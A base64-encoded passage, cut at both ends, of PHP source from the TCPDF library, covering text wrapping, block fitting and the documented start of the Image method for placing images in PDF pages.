ZpcnN0bGluZSkgewoJCQkJCQkJCSR0aGlzLT5jZWxsX3BhZGRpbmcgPSAkdG1wY2VsbHBhZGRpbmc7CgkJCQkJCQkJcmV0dXJuIChUQ1BERl9GT05UUzo6VW5pQXJyU3ViU3RyaW5nKCR1Y2hhcnMsICRpKSk7CgkJCQkJCQl9CgkJCQkJCQkkaiA9ICRpOwoJCQkJCQkJLS0kaTsKCQkJCQkJfSBlbHNlIHsKCQkJCQkJCS8vIHdvcmQgd3JhcHBpbmcKCQkJCQkJCWlmICgkc2h5KSB7CgkJCQkJCQkJLy8gYWRkIGh5cGVuIChtaW51cyBzeW1ib2wpIGF0IHRoZSBlbmQgb2YgdGhlIGxpbmUKCQkJCQkJCQkkc2h5X3dpZHRoID0gJHRtcF9zaHlfcmVwbGFjZW1lbnRfd2lkdGg7CgkJCQkJCQkJaWYgKCR0aGlzLT5ydGwpIHsKCQkJCQkJCQkJJHNoeV9jaGFyX2xlZnQgPSAkdG1wX3NoeV9yZXBsYWNlbWVudF9jaGFyOwoJCQkJCQkJCQkkc2h5X2NoYXJfcmlnaHQgPSAnJzsKCQkJCQkJCQl9IGVsc2UgewoJCQkJCQkJCQkkc2h5X2NoYXJfbGVmdCA9ICcnOwoJCQkJCQkJCQkkc2h5X2NoYXJfcmlnaHQgPSAkdG1wX3NoeV9yZXBsYWNlbWVudF9jaGFyOwoJCQkJCQkJCX0KCQkJCQkJCX0gZWxzZSB7CgkJCQkJCQkJJHNoeV93aWR0aCA9IDA7CgkJCQkJCQkJJHNoeV9jaGFyX2xlZnQgPSAnJzsKCQkJCQkJCQkkc2h5X2NoYXJfcmlnaHQgPSAnJzsKCQkJCQkJCX0KCQkJCQkJCSR0bXBzdHIgPSBUQ1BERl9GT05UUzo6VW5pQXJyU3ViU3RyaW5nKCR1Y2hhcnMsICRqLCAoJHNlcCArICRlbmRzcGFjZSkpOwoJCQkJCQkJaWYgKCRmaXJzdGxpbmUpIHsKCQkJCQkJCQkkc3RhcnR4ID0gJHRoaXMtPng7CgkJCQkJCQkJJHRtcGFyciA9IGFycmF5X3NsaWNlKCRjaGFycywgJGosICgoJHNlcCArICRlbmRzcGFjZSkgLSAkaikpOwoJCQkJCQkJCWlmICgkcnRsbW9kZSkgewoJCQkJCQkJCQkkdG1wYXJyID0gVENQREZfRk9OVFM6OnV0ZjhCaWRpKCR0bXBhcnIsICR0bXBzdHIsICR0aGlzLT50bXBydGwsICR0aGlzLT5pc3VuaWNvZGUsICR0aGlzLT5DdXJyZW50Rm9udCk7CgkJCQkJCQkJfQoJCQkJCQkJCSRsaW5ldyA9ICR0aGlzLT5HZXRBcnJTdHJpbmdXaWR0aCgkdG1wYXJyKTsKCQkJCQkJCQl1bnNldCgkdG1wYXJyKTsKCQkJCQkJCQlpZiAoJHRoaXMtPnJ0bCkgewoJCQkJCQkJCQkkdGhpcy0+ZW5kbGluZXggPSAkc3RhcnR4IC0gJGxpbmV3IC0gJHNoeV93aWR0aDsKCQkJCQkJCQl9IGVsc2UgewoJCQkJCQkJCQkkdGhpcy0+ZW5kbGluZXggPSAkc3RhcnR4ICsgJGxpbmV3ICsgJHNoeV93aWR0aDsKCQkJCQkJCQl9CgkJCQkJCQkJJHcgPSAkbGluZXc7CgkJCQkJCQkJJHRtcGNlbGxwYWRkaW5nID0gJHRoaXMtPmNlbGxfcGFkZGluZzsKCQkJCQkJCQlpZiAoJG1heGggPT0gMCkgewoJCQkJCQkJCQkkdGhpcy0+c2V0Q2VsbFBhZGRpbmcoMCk7CgkJCQkJCQkJfQoJCQkJCQkJfQoJCQkJCQkJLy8gcHJpbnQgdGhlIGxpbmUKCQkJCQkJCWlmICgkZmlyc3RibG9jayBBTkQgJHRoaXMtPmlzUlRMVGV4dERpcigpKSB7CgkJCQkJCQkJJHRtcHN0ciA9ICR0aGlzLT5zdHJpbmdSaWdodFRyaW0oJHRtcHN0cik7CgkJCQkJCQl9CgkJCQkJCQkkdGhpcy0+Q2VsbCgkdywgJGgsICRzaHlfY2hhcl9sZWZ0LiR0bXBzdHIuJHNoeV9jaGFyX3JpZ2h0LCAwLCAxLCAkYWxpZ24sICRmaWxsLCAkbGluaywgJHN0cmV0Y2gpOwoJCQkJCQkJdW5zZXQoJHRtcHN0cik7CgkJCQkJCQlpZiAoJGZpcnN0bGluZSkgewoJCQkJCQkJCWlmICgkY2hhcnNbJHNlcF0gPT0gNDUpIHsKCQkJCQkJCQkJJGVuZHNwYWNlICs9IDE7CgkJCQkJCQkJfQoJCQkJCQkJCS8vIHJldHVybiB0aGUgcmVtYWluaW5nIHRleHQKCQkJCQkJCQkkdGhpcy0+Y2VsbF9wYWRkaW5nID0gJHRtcGNlbGxwYWRkaW5nOwoJCQkJCQkJCXJldHVybiAoVENQREZfRk9OVFM6OlVuaUFyclN1YlN0cmluZygkdWNoYXJzLCAoJHNlcCArICRlbmRzcGFjZSkpKTsKCQkJCQkJCX0KCQkJCQkJCSRpID0gJHNlcDsKCQkJCQkJCSRzZXAgPSAtMTsKCQkJCQkJCSRzaHkgPSBmYWxzZTsKCQkJCQkJCSRqID0gKCRpICsgMSk7CgkJCQkJCX0KCQkJCQl9CgkJCQkJLy8gYWNjb3VudCBmb3IgbWFyZ2luIGNoYW5nZXMKCQkJCQlpZiAoKCgkdGhpcy0+eSArICR0aGlzLT5sYXN0aCkgPiAkdGhpcy0+UGFnZUJyZWFrVHJpZ2dlcikgQU5EICgkdGhpcy0+aW5QYWdlQm9keSgpKSkgewoJCQkJCQlpZiAoJHRoaXMtPkFjY2VwdFBhZ2VCcmVhaygpKQoJCQkJCQl7CgkJCQkJCQlpZiAoJHRoaXMtPnJ0bCkgewoJCQkJCQkJCSR0aGlzLT54IC09ICRtYXJnaW5bJ1InXTsKCQkJCQkJCX0gZWxzZSB7CgkJCQkJCQkJJHRoaXMtPnggKz0gJG1hcmdpblsnTCddOwoJCQkJCQkJfQoJCQkJCQkJJHRoaXMtPmxNYXJnaW4gKz0gJG1hcmdpblsnTCddOwoJCQkJCQkJJHRoaXMtPnJNYXJnaW4gKz0gJG1hcmdpblsnUiddOwoJCQkJCQl9CgkJCQkJfQoJCQkJCSR3ID0gJHRoaXMtPmdldFJlbWFpbmluZ1dpZHRoKCk7CgkJCQkJJHdtYXggPSAkdyAtICR0aGlzLT5jZWxsX3BhZGRpbmdbJ0wnXSAtICR0aGlzLT5jZWxsX3BhZGRpbmdbJ1InXTsKCQkJCQlpZiAoJGxpbmVicmVhaykgewoJCQkJCQkkbGluZWJyZWFrID0gZmFsc2U7CgkJCQkJfSBlbHNlIHsKCQkJCQkJKyskbmw7CgkJCQkJCSRsID0gMDsKCQkJCQl9CgkJCQl9CgkJCX0KCQkJLy8gc2F2ZSBsYXN0IGNoYXJhY3RlcgoJCQkkcGMgPSAkYzsKCQkJKyskaTsKCQl9IC8vIGVuZCB3aGlsZSBpIDwgbmIKCQkvLyBwcmludCBsYXN0IHN1YnN0cmluZyAoaWYgYW55KQoJCWlmICgkbCA+IDApIHsKCQkJc3dpdGNoICgkYWxpZ24pIHsKCQkJCWNhc2UgJ0onOgoJCQkJY2FzZSAnQyc6IHsKCQkJCQlicmVhazsKCQkJCX0KCQkJCWNhc2UgJ0wnOiB7CgkJCQkJaWYgKCEkdGhpcy0+cnRsKSB7CgkJCQkJCSR3ID0gJGw7CgkJCQkJfQoJCQkJCWJyZWFrOwoJCQkJfQoJCQkJY2FzZSAnUic6IHsKCQkJCQlpZiAoJHRoaXMtPnJ0bCkgewoJCQkJCQkkdyA9ICRsOwoJCQkJCX0KCQkJCQlicmVhazsKCQkJCX0KCQkJCWRlZmF1bHQ6IHsKCQkJCQkkdyA9ICRsOwoJCQkJCWJyZWFrOwoJCQkJfQoJCQl9CgkJCSR0bXBzdHIgPSBUQ1BERl9GT05UUzo6VW5pQXJyU3ViU3RyaW5nKCR1Y2hhcnMsICRqLCAkbmIpOwoJCQlpZiAoJGZpcnN0bGluZSkgewoJCQkJJHN0YXJ0eCA9ICR0aGlzLT54OwoJCQkJJHRtcGFyciA9IGFycmF5X3NsaWNlKCRjaGFycywgJGosICgkbmIgLSAkaikpOwoJCQkJaWYgKCRydGxtb2RlKSB7CgkJCQkJJHRtcGFyciA9IFRDUERGX0ZPTlRTOjp1dGY4QmlkaSgkdG1wYXJyLCAkdG1wc3RyLCAkdGhpcy0+dG1wcnRsLCAkdGhpcy0+aXN1bmljb2RlLCAkdGhpcy0+Q3VycmVudEZvbnQpOwoJCQkJfQoJCQkJJGxpbmV3ID0gJHRoaXMtPkdldEFyclN0cmluZ1dpZHRoKCR0bXBhcnIpOwoJCQkJdW5zZXQoJHRtcGFycik7CgkJCQlpZiAoJHRoaXMtPnJ0bCkgewoJCQkJCSR0aGlzLT5lbmRsaW5leCA9ICRzdGFydHggLSAkbGluZXc7CgkJCQl9IGVsc2UgewoJCQkJCSR0aGlzLT5lbmRsaW5leCA9ICRzdGFydHggKyAkbGluZXc7CgkJCQl9CgkJCQkkdyA9ICRsaW5ldzsKCQkJCSR0bXBjZWxscGFkZGluZyA9ICR0aGlzLT5jZWxsX3BhZGRpbmc7CgkJCQlpZiAoJG1heGggPT0gMCkgewoJCQkJCSR0aGlzLT5zZXRDZWxsUGFkZGluZygwKTsKCQkJCX0KCQkJfQoJCQlpZiAoJGZpcnN0YmxvY2sgQU5EICR0aGlzLT5pc1JUTFRleHREaXIoKSkgewoJCQkJJHRtcHN0ciA9ICR0aGlzLT5zdHJpbmdSaWdodFRyaW0oJHRtcHN0cik7CgkJCX0KCQkJJHRoaXMtPkNlbGwoJHcsICRoLCAkdG1wc3RyLCAwLCAkbG4sICRhbGlnbiwgJGZpbGwsICRsaW5rLCAkc3RyZXRjaCk7CgkJCXVuc2V0KCR0bXBzdHIpOwoJCQlpZiAoJGZpcnN0bGluZSkgewoJCQkJJHRoaXMtPmNlbGxfcGFkZGluZyA9ICR0bXBjZWxscGFkZGluZzsKCQkJCXJldHVybiAoVENQREZfRk9OVFM6OlVuaUFyclN1YlN0cmluZygkdWNoYXJzLCAkbmIpKTsKCQkJfQoJCQkrKyRubDsKCQl9CgkJaWYgKCRmaXJzdGxpbmUpIHsKCQkJcmV0dXJuICcnOwoJCX0KCQlyZXR1cm4gJG5sOwoJfQoKCS8qKgoJICogUmV0dXJucyB0aGUgcmVtYWluaW5nIHdpZHRoIGJldHdlZW4gdGhlIGN1cnJlbnQgcG9zaXRpb24gYW5kIG1hcmdpbnMuCgkgKiBAcmV0dXJuIGZsb2F0IFJldHVybiB0aGUgcmVtYWluaW5nIHdpZHRoCgkgKiBAcHJvdGVjdGVkCgkgKi8KCXByb3RlY3RlZCBmdW5jdGlvbiBnZXRSZW1haW5pbmdXaWR0aCgpIHsKCQlsaXN0KCR0aGlzLT54LCAkdGhpcy0+eSkgPSAkdGhpcy0+Y2hlY2tQYWdlUmVnaW9ucygwLCAkdGhpcy0+eCwgJHRoaXMtPnkpOwoJCWlmICgkdGhpcy0+cnRsKSB7CgkJCXJldHVybiAoJHRoaXMtPnggLSAkdGhpcy0+bE1hcmdpbik7CgkJfSBlbHNlIHsKCQkJcmV0dXJuICgkdGhpcy0+dyAtICR0aGlzLT5yTWFyZ2luIC0gJHRoaXMtPngpOwoJCX0KCX0KCgkvKioKCSAqIFNldCB0aGUgYmxvY2sgZGltZW5zaW9ucyBhY2NvdW50aW5nIGZvciBwYWdlIGJyZWFrcyBhbmQgcGFnZS9jb2x1bW4gZml0dGluZwoJICogQHBhcmFtIGZsb2F0ICR3IHdpZHRoCgkgKiBAcGFyYW0gZmxvYXQgJGggaGVpZ2h0CgkgKiBAcGFyYW0gZmxvYXQgJHggWCBjb29yZGluYXRlCgkgKiBAcGFyYW0gZmxvYXQgJHkgWSBjb29kaWFudGUKCSAqIEBwYXJhbSBib29sZWFuICRmaXRvbnBhZ2UgaWYgdHJ1ZSB0aGUgYmxvY2sgaXMgcmVzaXplZCB0byBub3QgZXhjZWVkIHBhZ2UgZGltZW5zaW9ucy4KCSAqIEByZXR1cm4gYXJyYXkgYXJyYXkoJHcsICRoLCAkeCwgJHkpCgkgKiBAcHJvdGVjdGVkCgkgKiBAc2luY2UgNS41LjAwOSAoMjAxMC0wNy0wNSkKCSAqLwoJcHJvdGVjdGVkIGZ1bmN0aW9uIGZpdEJsb2NrKCR3LCAkaCwgJHgsICR5LCAkZml0b25wYWdlPWZhbHNlKSB7CgkJaWYgKCR3IDw9IDApIHsKCQkJLy8gc2V0IG1heGltdW0gd2lkdGgKCQkJJHcgPSAoJHRoaXMtPncgLSAkdGhpcy0+bE1hcmdpbiAtICR0aGlzLT5yTWFyZ2luKTsKCQkJaWYgKCR3IDw9IDApIHsKCQkJCSR3ID0gMTsKCQkJfQoJCX0KCQlpZiAoJGggPD0gMCkgewoJCQkvLyBzZXQgbWF4aW11bSBoZWlnaHQKCQkJJGggPSAoJHRoaXMtPlBhZ2VCcmVha1RyaWdnZXIgLSAkdGhpcy0+dE1hcmdpbik7CgkJCWlmICgkaCA8PSAwKSB7CgkJCQkkaCA9IDE7CgkJCX0KCQl9CgkJLy8gcmVzaXplIHRoZSBibG9jayB0byBiZSB2ZXJ0aWNhbGx5IGNvbnRhaW5lZCBvbiBhIHNpbmdsZSBwYWdlIG9yIHNpbmdsZSBjb2x1bW4KCQlpZiAoJGZpdG9ucGFnZSBPUiAkdGhpcy0+QXV0b1BhZ2VCcmVhaykgewoJCQkkcmF0aW9fd2ggPSAoJHcgLyAkaCk7CgkJCWlmICgkaCA+ICgkdGhpcy0+UGFnZUJyZWFrVHJpZ2dlciAtICR0aGlzLT50TWFyZ2luKSkgewoJCQkJJGggPSAkdGhpcy0+UGFnZUJyZWFrVHJpZ2dlciAtICR0aGlzLT50TWFyZ2luOwoJCQkJJHcgPSAoJGggKiAkcmF0aW9fd2gpOwoJCQl9CgkJCS8vIHJlc2l6ZSB0aGUgYmxvY2sgdG8gYmUgaG9yaXpvbnRhbGx5IGNvbnRhaW5lZCBvbiBhIHNpbmdsZSBwYWdlIG9yIHNpbmdsZSBjb2x1bW4KCQkJaWYgKCRmaXRvbnBhZ2UpIHsKCQkJCSRtYXh3ID0gKCR0aGlzLT53IC0gJHRoaXMtPmxNYXJnaW4gLSAkdGhpcy0+ck1hcmdpbik7CgkJCQlpZiAoJHcgPiAkbWF4dykgewoJCQkJCSR3ID0gJG1heHc7CgkJCQkJJGggPSAoJHcgLyAkcmF0aW9fd2gpOwoJCQkJfQoJCQl9CgkJfQoJCS8vIENoZWNrIHdoZXRoZXIgd2UgbmVlZCBhIG5ldyBwYWdlIG9yIG5ldyBjb2x1bW4gZmlyc3QgYXMgdGhpcyBkb2VzIG5vdCBmaXQKCQkkcHJldl94ID0gJHRoaXMtPng7CgkJJHByZXZfeSA9ICR0aGlzLT55OwoJCWlmICgkdGhpcy0+Y2hlY2tQYWdlQnJlYWsoJGgsICR5KSBPUiAoJHRoaXMtPnkgPCAkcHJldl95KSkgewoJCQkkeSA9ICR0aGlzLT55OwoJCQlpZiAoJHRoaXMtPnJ0bCkgewoJCQkJJHggKz0gKCRwcmV2X3ggLSAkdGhpcy0+eCk7CgkJCX0gZWxzZSB7CgkJCQkkeCArPSAoJHRoaXMtPnggLSAkcHJldl94KTsKCQkJfQoJCQkkdGhpcy0+bmV3bGluZSA9IHRydWU7CgkJfQoJCS8vIHJlc2l6ZSB0aGUgYmxvY2sgdG8gYmUgY29udGFpbmVkIG9uIHRoZSByZW1haW5pbmcgYXZhaWxhYmxlIHBhZ2Ugb3IgY29sdW1uIHNwYWNlCgkJaWYgKCRmaXRvbnBhZ2UpIHsKCQkJLy8gZmFsbGJhY2sgdG8gYXZvaWQgZGl2aXNpb24gYnkgemVybwoJCQkkaCA9ICRoID09IDAgPyAxIDogJGg7CgkJCSRyYXRpb193aCA9ICgkdyAvICRoKTsKCQkJaWYgKCgkeSArICRoKSA+ICR0aGlzLT5QYWdlQnJlYWtUcmlnZ2VyKSB7CgkJCQkkaCA9ICR0aGlzLT5QYWdlQnJlYWtUcmlnZ2VyIC0gJHk7CgkJCQkkdyA9ICgkaCAqICRyYXRpb193aCk7CgkJCX0KCQkJaWYgKCghJHRoaXMtPnJ0bCkgQU5EICgoJHggKyAkdykgPiAoJHRoaXMtPncgLSAkdGhpcy0+ck1hcmdpbikpKSB7CgkJCQkkdyA9ICR0aGlzLT53IC0gJHRoaXMtPnJNYXJnaW4gLSAkeDsKCQkJCSRoID0gKCR3IC8gJHJhdGlvX3doKTsKCQkJfSBlbHNlaWYgKCgkdGhpcy0+cnRsKSBBTkQgKCgkeCAtICR3KSA8ICgkdGhpcy0+bE1hcmdpbikpKSB7CgkJCQkkdyA9ICR4IC0gJHRoaXMtPmxNYXJnaW47CgkJCQkkaCA9ICgkdyAvICRyYXRpb193aCk7CgkJCX0KCQl9CgkJcmV0dXJuIGFycmF5KCR3LCAkaCwgJHgsICR5KTsKCX0KCgkvKioKCSAqIFB1dHMgYW4gaW1hZ2UgaW4gdGhlIHBhZ2UuCgkgKiBUaGUgdXBwZXItbGVmdCBjb3JuZXIgbXVzdCBiZSBnaXZlbi4KCSAqIFRoZSBkaW1lbnNpb25zIGNhbiBiZSBzcGVjaWZpZWQgaW4gZGlmZmVyZW50IHdheXM6PHVsPgoJICogPGxpPmV4cGxpY2l0IHdpZHRoIGFuZCBoZWlnaHQgKGV4cHJlc3NlZCBpbiB1c2VyIHVuaXQpPC9saT4KCSAqIDxsaT5vbmUgZXhwbGljaXQgZGltZW5zaW9uLCB0aGUgb3RoZXIgYmVpbmcgY2FsY3VsYXRlZCBhdXRvbWF0aWNhbGx5IGluIG9yZGVyIHRvIGtlZXAgdGhlIG9yaWdpbmFsIHByb3BvcnRpb25zPC9saT4KCSAqIDxsaT5ubyBleHBsaWNpdCBkaW1lbnNpb24sIGluIHdoaWNoIGNhc2UgdGhlIGltYWdlIGlzIHB1dCBhdCA3MiBkcGk8L2xpPjwvdWw+CgkgKiBTdXBwb3J0ZWQgZm9ybWF0cyBhcmUgSlBFRyBhbmQgUE5HIGltYWdlcyB3aGl0b3V0IEdEIGxpYnJhcnkgYW5kIGFsbCBpbWFnZXMgc3VwcG9ydGVkIGJ5IEdEOiBHRCwgR0QyLCBHRDJQQVJULCBHSUYsIEpQRUcsIFBORywgQk1QLCBYQk0sIFhQTTsKCSAqIFRoZSBmb3JtYXQgY2FuIGJlIHNwZWNpZmllZCBleHBsaWNpdGx5IG9yIGluZmVycmVkIGZyb20gdGhlIGZpbGUgZXh0ZW5zaW9uLjxiciAvPgoJICogSXQgaXMgcG9zc2libGUgdG8gcHV0IGEgbGluayBvbiB0aGUgaW1hZ2UuPGJyIC8+CgkgKiBSZW1hcms6IGlmIGFuIGltYWdlIGlzIHVzZWQgc2V2ZXJhbCB0aW1lcywgb25seSBvbmUgY29weSB3aWxsIGJlIGVtYmVkZGVkIGluIHRoZSBmaWxlLjxiciAvPgoJICogQHBhcmFtIHN0cmluZyAkZmlsZSBOYW1lIG9mIHRoZSBmaWxlIGNvbnRhaW5pbmcgdGhlIGltYWdlIG9yIGEgJ0AnIGNoYXJhY3RlciBmb2xsb3dlZCBieSB0aGUgaW1hZ2UgZGF0YSBzdHJpbmcuIFRvIGxpbmsgYW4gaW1hZ2Ugd2l0aG91dCBlbWJlZGRpbmcgaXQgb24gdGhlIGRvY3VtZW50LCBzZXQgYW4gYXN0ZXJpc2sgY2hhcmFjdGVyIGJlZm9yZSB0aGUgVVJMIChpLmUuOiAnKmh0dHA6Ly93d3cuZXhhbXBsZS5jb20vaW1hZ2UuanBnJykuCgkgKiBAcGFyYW0gZmxvYXR8bnVsbCAkeCBBYnNjaXNzYSBvZiB0aGUgdXBwZXItbGVmdCBjb3JuZXIgKExUUikgb3IgdXBwZXItcmlnaHQgY29ybmVyIChSVEwpLgoJICogQHBhcmFtIGZsb2F0fG51bGwgJHkgT3JkaW5hdGUgb2YgdGhlIHVwcGVyLWxlZnQgY29ybmVyIChMVFIpIG9yIHVwcGVyLXJpZ2h0IGNvcm5lciAoUlRMKS4KCSAqIEBwYXJhbSBmbG9hdCAkdyBXaWR0aCBvZiB0aGUgaW1hZ2UgaW4gdGhlIHBhZ2UuIElmIG5vdCBzcGVjaWZpZWQgb3IgZXF1YWwgdG8gemVybywgaXQgaXMgYXV0b21hdGljYWxseSBjYWxjdWxhdGVkLgoJICogQHBhcmFtIGZsb2F0ICRoIEhlaWdodCBvZiB0aGUgaW1hZ2UgaW4gdGhlIHBhZ2UuIElmIG5vdCBzcGVjaWZpZWQgb3IgZXF1YWwgdG8gemVybywgaXQgaXMgYXV0b21hdGljYWxseSBjYWxjdWxhdGVkLgoJICogQHBhcmFtIHN0cmluZyAkdHlwZSBJbWFnZSBmb3JtYXQuIFBvc3NpYmxlIHZhbHVlcyBhcmUgKGNhc2UgaW5zZW5zaXRpdmUpOiBKUEVHIGFuZCBQTkcgKHdoaXRvdXQgR0QgbGlicmFyeSkgYW5kIGFsbCBpbWFnZXMgc3VwcG9ydGVkIGJ5IEdEOiBHRCwgR0QyLCBHRDJQQVJULCBHSUYsIEpQRUcsIFBORywgQk1QLCBYQk0sIFhQTTsuIElmIG5vdCBzcGVjaWZpZWQsIHRoZSB0eXBlIGlzIGluZmVycmVkIGZyb20gdGhlIGZpbGUgZXh0ZW5zaW9uLgoJICogQHBhcmFtIG1peGVkICRsaW5rIFVSTCBvciBpZGVudGlmaWVyIHJldHVybmVkIGJ5IEFkZExpbmsoKS4KCSAqIEBwYXJhbSBzdHJpbmcgJGFsaWduIEluZGljYXRlcyB0aGUgYWxpZ25tZW50IG9mIHRoZSBwb2ludGVyIG5leHQgdG8gaW1hZ2UgaW5zZXJ0aW9uIHJlbGF0aXZlIHRvIGltYWdlIGhlaWdodC4gVGhlIHZhbHVlIGNhbiBiZTo8dWw+PGxpPlQ6IHRvcC1yaWdodCBmb3IgTFRSIG9yIHRvcC1sZWZ0IGZvciBSVEw8L2xpPjxsaT5NOiBtaWRkbGUtcmlnaHQgZm9yIExUUiBvciBtaWRkbGUtbGVmdCBmb3IgUlRMPC9saT48bGk+QjogYm90dG9tLXJpZ2h0IGZvciBMVFIgb3IgYm90dG9tLWxlZnQgZm9yIFJUTDwvbGk+PGxpPk46IG5leHQgbGluZTwvbGk+PC91bD4KCSAqIEBwYXJhbSBtaXhlZCAkcmVzaXplIElmIHRydWUgcmVzaXplIChyZWR1Y2UpIHRoZSBpbWFnZSB0byBmaXQgJHcgYW5kICRoIChyZXF1aXJlcyBHRCBvciBJbWFnZU1hZ2ljayBsaWJyYXJ5KTsgaWYgZmFsc2UgZG8gbm90IHJlc2l6ZTsgaWYgMiBmb3JjZSByZXNpemUgaW4gYWxsIGNhc2VzICh1cHNjYWxpbmcgYW5kIGRvd25zY2FsaW5nKS4KCSAqIEBwYXJhbSBpbnQgJGRwaSBkb3QtcGVyLWluY2ggcmVzb2x1dGlvbiB1c2VkIG9uIHJlc2l6ZQoJICogQHBhcmFtIHN0cmluZyAkcGFsaWduIEFsbG93cyB0byBjZW50ZXIgb3IgYWxpZ24gdGhlIGltYWdlIG9uIHRoZSBjdXJyZW50IGxpbmUuIFBvc3NpYmxlIHZhbHVlcyBhcmU6PHVsPjxsaT5MIDogbGVmdCBhbGlnbjwvbGk+PGxpPkMgOiBjZW50ZXI8L2xpPjxsaT5SIDogcmlnaHQgYWxpZ248L2xpPjxsaT4nJyA6IGVtcHR5IHN0cmluZyA6IGxlZnQgZm9yIExUUiBvciByaWdodCBmb3IgUlRMPC9saT48L3VsPgoJICogQHBhcmFtIGJvb2xlYW4gJGlzbWFzayB0cnVlIGlmIHRoaXMgaW1hZ2UgaXMgYSBtYXNrLCBmYWxzZSBvdGhlcndpc2UKCSAqIEBwYXJhbSBtaXhlZCAkaW1nbWFzayBpbWFnZSBvYmplY3QgcmV0dXJuZWQgYnkgdGhpcyBmdW5jdGlvbiBvciBmYWxzZQoJICogQHBhcmFtIG1peGVkICRib3JkZXIgSW5kaWNhdGVzIGlmIGJvcmRlcnMgbXVzdCBiZSBkcmF3biBhcm91bmQgdGhlIGNlbGwuIFRoZSB2YWx1ZSBjYW4gYmUgYSBudW1iZXI6PHVsPjxsaT4wOiBubyBib3JkZXIgKGRlZmF1bHQpPC9saT48bGk+MTogZnJhbWU8L2xpPjwvdWw+IG9yIGEgc3RyaW5nIGNvbnRhaW5pbmcgc29tZSBvciBhbGwgb2YgdGhlIGZvbGxvd2luZyBjaGFyYWN0ZXJzIChpbiBhbnkgb3JkZXIpOjx1bD48bGk+TDogbGVmdDwvbGk+PGxpPlQ6IHRvcDwvbGk+PGxpPlI6IHJpZ2h0PC9saT48bGk+QjogYm90dG9tPC9saT48L3VsPiBvciBhbiBhcnJheSBvZiBsaW5lIHN0eWxlcyBmb3IgZWFjaCBib3JkZXIgZ3JvdXAgLSBmb3IgZXhhbXBsZTogYXJyYXkoJ0xUUkInID0+IGFycmF5KCd3aWR0aCcgPT4gMiwgJ2NhcCcgPT4gJ2J1dHQnLCAnam9pbicgPT4gJ21pdGVyJywgJ2Rhc2gnID0+IDAsICdjb2xvcicgPT4gYXJyYXkoMCwgMCwgMCkpKQoJICogQHBhcmFtIG1peGVkICRmaXRib3ggSWYgbm90IGZhbHNlIHNjYWxlIGltYWdlIGRpbWVuc2lvbnMgcHJvcG9ydGlvbmFsbHkgdG8gZml0IHdpdGhpbiB0aGUgKCR3LCAkaCkgYm94LiAkZml0Ym94IGNhbiBiZSB0cnVlIG9yIGEgMiBjaGFyYWN0ZXJzIHN0cmluZyBpbmRpY2F0aW5nIHRoZSBpbWFnZSBhbGlnbm1lbnQgaW5zaWRlIHRoZSBib3guIFRoZSBmaXJzdCBjaGFyYWN0ZXIgaW5kaWNhdGUgdGhlIGhvcml6b250YWwgYWxpZ25tZW50IChMID0gbGVmdCwgQyA9IGNlbnRlciwgUiA9IHJpZ2h0KSB0aGUgc2Vjb25kIGNoYXJhY3RlciBpbmRpY2F0ZSB0aGUgdmVydGljYWwgYWxnbm1lbnQgKFQgPSB0b3AsIE0gPSBtaWRkbGUsIEIgPSBib3R0b20pLgoJICogQHBhcmFtIGJvb2xlYW4gJGhpZGRlbiBJZiB0cnVlIGRvIG5vdCBkaXNwbGF5IHRoZSBpbWFnZS4KCSAqIEBwYXJhbSBib29sZWFuICRmaXRvbnBhZ2UgSWYgdHJ1ZSB0aGUgaW1hZ2UgaXMgcmVzaXplZCB0byBub3QgZXhjZWVkIHBhZ2UgZGltZW5zaW9ucy4KCSAqIEBwYXJhbSBib29sZWFuICRhbHQgSWYgdHJ1ZSB0aGUgaW1hZ2Ugd2lsbCBiZSBhZGRlZCBhcyBhbHRlcm5hdGl2ZSBhbmQgbm90IGRpcmVjdGx5IHByaW50ZWQgKHRoZSBJRCBvZiB0aGUgaW1hZ2Ugd2lsbCBiZSByZXR1cm5lZCkuCgkgKiBAcGFyYW0gYXJyYXkgJGFsdGltZ3MgQXJyYXkgb2YgYWx0ZXJuYXRlIGltYWdlcyBJRHMuIEVhY2ggYWx0ZXJuYXRpdmUgaW1hZ2UgbXVzdCBiZSBhbiBhcnJheSB3aXRoIHR3byB2YWx1ZXM6IGFuIGludGVnZXIgcmVwcmVzZW50aW5nIHRoZSBpbWFnZSBJRCAodGhlIHZhbHVlIHJldHVybmVkIGJ5IHRoZSBJbWFnZSBtZXRob2QpIGFuZCBhIGJvb2xlYW4gdmFsdWUgdG8gaW5kaWNhdGUgaWYgdGhlIGltYWdlIGlzIHRoZSBkZWZhdWx0IGZvciBwcmludGluZy4KCSAqIEByZXR1cm4gbWl4ZWR8ZmFsc2UgaW1hZ2UgaW5mb3JtYXRpb24KCSAqIEBwdWJsaWMKCSAqIEBzaW5jZSAxLjEKCSAqLwoJcHVibGljIGZ1bmN0aW9uIEltYWdlKCRmaWxlLCAkeD1udWxsLCAkeT1udWxsLCAkdz0wLCAkaD0wLCAkdHlwZT0nJywgJGxpbms9JycsICRhbGlnbj0nJywgJHJlc2l6ZT1mYWxzZSwgJGRwaT0zMDAsICRwYWxpZ249JycsICRpc21hc2s9ZmFsc2UsICRpbWdtYXNrPWZhbHNlLCAkYm9yZGVyPTAsICRmaXRib3g9ZmFsc2UsICRoaWRkZW49ZmFsc2UsICRmaXRvbnBhZ2U9ZmFsc2UsICRhbHQ9ZmFsc2UsICRhbHRpbWdzPWFycmF5KCkpIHsKCQlpZiAoJHRoaXMtPnN0YXRlICE9IDIpIHsKCQkJcmV0dXJuIGZhbHNlOwoJCX0KCQlpZiAoVENQREZfU1RBVElDOjplbXB0eV9zdHJpbmcoJHgpKSB7CgkJCSR4ID0gJHRoaXMtPng7CgkJfQoJCWlmIChUQ1BERl9TVEFUSUM6OmVtcHR5X3N0cmluZygkeSkpIHsKCQkJJHkgPSAkdGhpcy0+eTsKCQl9CgkJLy8gY2hlY2sgcGFnZSBmb3Igbm8td3JpdGUgcmVnaW9ucyBhbmQgYWRhcHQgcGFnZSBtYXJnaW5zIGlmIG5lY2Vzc2FyeQoJCWxpc3QoJHgsICR5KSA9ICR0aGlzLT5jaGVja1BhZ2VSZWdpb25zKCRoLCAkeCwgJHkpOwoJCSRleHVybCA9ICcnOyAvLyBleHRlcm5hbCBzdHJlYW1zCgkJJGltc2l6ZSA9IEZBTFNFOwoKICAgICAgICAvLyBNYWtlIHN1cmUgdGhlIGZpbGUgdmFyaWFibGUgaXMgbm90IGVtcHR5IG9yIG51bGwgYmVjYXVzZSBhY2Nlc3NpbmcgJGZpbGVbMF0gbGF0ZXIKICAgICAgICAvLyByZXN1bHRzIGluIGVycm9yIHdoZW4gcnVubmluZyBQSFAgNy40CiAgICAgICAgaWYgKGVtcHR5KCRmaWxlKSkgewogICAgIC